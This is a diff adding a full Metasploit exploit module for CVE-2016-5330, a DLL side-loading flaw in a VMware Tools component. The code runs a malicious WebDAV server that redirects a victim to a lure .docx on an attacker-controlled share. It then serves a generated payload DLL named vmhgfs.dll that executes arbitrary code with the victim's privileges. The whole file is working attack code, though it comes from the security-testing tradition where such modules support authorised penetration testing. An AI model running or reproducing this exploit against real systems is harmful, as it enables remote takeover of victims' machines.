@@ -1,0 +1,346 @@
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'DLL Side Loading Vulnerability in VMware Host Guest Client Redirector',
+      'Description'    => %q{
+      A DLL side loading vulnerability was found in the VMware Host Guest Client Redirector,
+      a component of VMware Tools. This issue can be exploited by luring a victim into
+      opening a document from the attacker's share. An attacker can exploit this issue to
+      execute arbitrary code with the privileges of the target user. This can potentially
+      result in the attacker taking complete control of the affected system. If the WebDAV
+      Mini-Redirector is enabled, it is possible to exploit this issue over the internet.
+      },
+      'Author'         => 'Yorick Koster',
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2016-5330'],
+          ['URL', 'https://securify.nl/advisory/SFY20151201/dll_side_loading_vulnerability_in_vmware_host_guest_client_redirector.html'],
+          ['URL', 'http://www.vmware.com/in/security/advisories/VMSA-2016-0010.html'],
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Payload'        => { 'Space' => 2048, },
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [ 'Windows x64', {'Arch' => ARCH_X64,} ],
+          [ 'Windows x86', {'Arch' => ARCH_X86,} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Aug 5 2016',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptPort.new('SRVPORT',     [ true, "The daemon port to listen on (do not change)", 80 ]),
+        OptString.new('URIPATH',   [ true, "The URI to use (do not change)", "/" ]),
+        OptString.new('BASENAME',  [ true, "The base name for the docx file", "Document1" ]),
+        OptString.new('SHARENAME', [ true, "The name of the top-level share", "documents" ])
+      ], self.class)
+
+    # no SSL
+    deregister_options('SSL', 'SSLVersion', 'SSLCert')
+  end
+
+
+  def on_request_uri(cli, request)
+    case request.method
+    when 'OPTIONS'
+      process_options(cli, request)
+    when 'PROPFIND'
+      process_propfind(cli, request)
+    when 'GET'
+      process_get(cli, request)
+    else
+      print_status("#{request.method} => 404 (#{request.uri})")
+      resp = create_response(404, "Not Found")
+      resp.body = ""
+      resp['Content-Type'] = 'text/html'
+      cli.send_response(resp)
+    end
+  end
+
+
+  def process_get(cli, request)
+    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+    webdav = "\\\\#{myhost}\\"
+
+    if (request.uri =~ /vmhgfs\.dll$/i)
+      print_status("GET => DLL Payload (#{request.uri})")
+      return if ((p = regenerate_payload(cli)) == nil)
+      data = generate_payload_dll({ :arch => target['Arch'], :code => p.encoded })
+      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
+      return
+    end
+
+    if (request.uri =~ /\.docx$/i)
+      print_status("GET => DOCX (#{request.uri})")
+      send_response(cli, "", { 'Content-Type' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' })
+      return
+    end
+
+    if (request.uri[-1,1] == "/" or request.uri =~ /index\.html?$/i)
+      print_status("GET => REDIRECT (#{request.uri})")
+      resp = create_response(200, "OK")
+      resp.body = %Q|<html><head><meta http-equiv="refresh" content="0;URL=file:\\\\#{@exploit_unc}#{datastore['SHARENAME']}\\#{datastore['BASENAME']}.docx"></head><body></body></html>|
+      resp['Content-Type'] = 'text/html'
+      cli.send_response(resp)
+      return
+    end
+
+    print_status("GET => 404 (#{request.uri})")
+    resp = create_response(404, "Not Found")
+    resp.body = ""
+    cli.send_response(resp)
+  end
+
+  #
+  # OPTIONS requests sent by the WebDav Mini-Redirector
+  #
+  def process_options(cli, request)
+    print_status("OPTIONS #{request.uri}")
+    headers = {
+      'MS-Author-Via' => 'DAV',
+      'DASL'          => '<DAV:sql>',
+      'DAV'           => '1, 2',
+      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
+      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
+      'Cache-Control' => 'private'
+    }
+    resp = create_response(207, "Multi-Status")
+    headers.each_pair {|k,v| resp[k] = v }
+    resp.body = ""
+    resp['Content-Type'] = 'text/xml'
+    cli.send_response(resp)
+  end
+
+  #
+  # PROPFIND requests sent by the WebDav Mini-Redirector
+  #
+  def process_propfind(cli, request)
+    path = request.uri
+    print_status("PROPFIND #{path}")
+    body = ''
+
+    my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+    my_uri    = "http://#{my_host}/"
+
+    if path !~ /\/$/
+
+      if blacklisted_path?(path)
+        print_status "PROPFIND => 404 (#{path})"
+        resp = create_response(404, "Not Found")
+        resp.body = ""
+        cli.send_response(resp)
+        return
+      end
+
+      if path.index(".")
+        print_status "PROPFIND => 207 File (#{path})"
+        body = %Q|<?xml version="1.0" encoding="utf-8"?>
+<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
+<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
+<D:href>#{path}</D:href>
+<D:propstat>
+<D:prop>
+<lp1:resourcetype/>
+<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
+<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
+<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
+<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
+<lp2:executable>T</lp2:executable>
+<D:supportedlock>
+<D:lockentry>
+<D:lockscope><D:exclusive/></D:lockscope>
+<D:locktype><D:write/></D:locktype>
+</D:lockentry>
+<D:lockentry>
+<D:lockscope><D:shared/></D:lockscope>
+<D:locktype><D:write/></D:locktype>
+</D:lockentry>
+</D:supportedlock>
+<D:lockdiscovery/>
+<D:getcontenttype>application/octet-stream</D:getcontenttype>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+</D:multistatus>
+|
+        # send the response
+        resp = create_response(207, "Multi-Status")
+        resp.body = body
+        resp['Content-Type'] = 'text/xml; charset="utf8"'
+        cli.send_response(resp)
+        return
+      else
+        print_status "PROPFIND => 301 (#{path})"
+        resp = create_response(301, "Moved")
+        resp["Location"] = path + "/"
+        resp['Content-Type'] = 'text/html'
+        cli.send_response(resp)
+        return
+      end
+    end
+
+    print_status "PROPFIND => 207 Directory (#{path})"
+    body = %Q|<?xml version="1.0" encoding="utf-8"?>
+<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
+<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
+<D:href>#{path}</D:href>
+<D:propstat>
+<D:prop>
+<lp1:resourcetype><D:collection/></lp1:resourcetype>
+<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
+<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
+<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
+<D:supportedlock>
+<D:lockentry>
+<D:lockscope><D:exclusive/></D:lockscope>
+<D:locktype><D:write/></D:locktype>
+</D:lockentry>
+<D:lockentry>
+<D:lockscope><D:shared/></D:lockscope>
+<D:locktype><D:write/></D:locktype>
+</D:lockentry>
+</D:supportedlock>
+<D:lockdiscovery/>
+<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+|
+
+    if request["Depth"].to_i > 0
+      trail = path.split("/")
+      trail.shift
+      case trail.length
+      when 0
+        body << generate_shares(path)
+      when 1
+        body << generate_files(path)
+      end
+    else
+      print_status "PROPFIND => 207 Top-Level Directory"
+    end
+
+    body << "</D:multistatus>"
+
+    body.gsub!(/\t/, '')
+
+    # send the response
+    resp = create_response(207, "Multi-Status")
+    resp.body = body
+    resp['Content-Type'] = 'text/xml; charset="utf8"'
+    cli.send_response(resp)
+  end
+
+  def generate_shares(path)
+    share_name = datastore['SHARENAME']
+%Q|
+<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
+<D:href>#{path}#{share_name}/</D:href>
+<D:propstat>
+<D:prop>
+<lp1:resourcetype><D:collection/></lp1:resourcetype>
+<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
+<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
+<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
+<D:supportedlock>
+<D:lockentry>
+<D:lockscope><D:exclusive/></D:lockscope>
+<D:locktype><D:write/></D:locktype>
+</D:lockentry>
+<D:lockentry>
+<D:lockscope><D:shared/></D:lockscope>
+<D:locktype><D:write/></D:locktype>
+</D:lockentry>
+</D:supportedlock>
+<D:lockdiscovery/>
+<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+|
+  end
+
+  def generate_files(path)
+    trail = path.split("/")
+    return "" if trail.length < 2
+
+    %Q|
+<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
+<D:href>#{path}#{datastore['BASENAME']}.docx</D:href>
+<D:propstat>
+<D:prop>
+<lp1:resourcetype/>
+<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
+<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
+<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
+<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
+<lp2:executable>T</lp2:executable>
+<D:supportedlock>
+<D:lockentry>
+<D:lockscope><D:exclusive/></D:lockscope>
+<D:locktype><D:write/></D:locktype>
+</D:lockentry>
+<D:lockentry>
+<D:lockscope><D:shared/></D:lockscope>
+<D:locktype><D:write/></D:locktype>
+</D:lockentry>
+</D:supportedlock>
+<D:lockdiscovery/>
+<D:getcontenttype>application/octet-stream</D:getcontenttype>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+|
+  end
+
+  def gen_timestamp(ttype=nil)
+    ::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
+  end
+
+  def gen_datestamp(ttype=nil)
+    ::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
+  end
+
+  # This method rejects requests that are known to break exploitation
+  def blacklisted_path?(uri)
+    return true if uri =~ /\.exe/i
+    return true if uri =~ /\.(config|manifest)/i
+    return true if uri =~ /desktop\.ini/i
+    return true if uri =~ /lib.*\.dll/i
+    return true if uri =~ /\.tmp$/i
+    return true if uri =~ /(pcap|packet)\.dll/i
+    false
+  end
+
+  def exploit
+
+    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']
+
+    @exploit_unc  = "\\\\#{myhost}\\"
+
+    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
+      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')
+    end
+
+    print_status("Files are available at #{@exploit_unc}#{datastore['SHARENAME']}")
+
+    super
+  end
+end
